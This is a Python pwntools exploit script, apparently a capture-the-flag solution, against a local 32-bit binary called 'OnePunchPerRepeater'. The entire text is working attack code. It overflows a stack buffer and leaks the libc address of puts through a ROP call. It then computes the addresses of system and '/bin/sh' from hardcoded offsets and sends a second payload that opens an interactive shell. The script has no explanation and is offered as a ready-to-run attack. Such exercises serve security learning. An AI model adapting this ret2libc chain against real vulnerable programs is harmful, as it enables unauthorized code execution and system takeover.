from pwn import *

io = process('OnePunchPerRepeater')
elf = ELF('OnePunchPerRepeater')

vul_func = 0x80486aa
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']

io.recvuntil('2) Exit\n')
io.sendline('1')
io.recvuntil('Input> ')
payload = 0x2c * 'a' + p32(puts_plt) + p32(vul_func) + p32(puts_got)
io.send(payload)
io.recvuntil('\n')
puts_addr = u32(io.recv(4))
print 'puts address is ' + hex(puts_addr)

puts_offset = 0x5fca0    # Get libc version according to leak address, then get function offset
system_offset = 0x3ada0
binsh_offset = 0x15ba0b
libc_addr = puts_addr - puts_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset

payload = 0x2c * 'a' + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
io.recvuntil('Input> ')
io.send(payload)
io.recvuntil('\n')

io.interactive()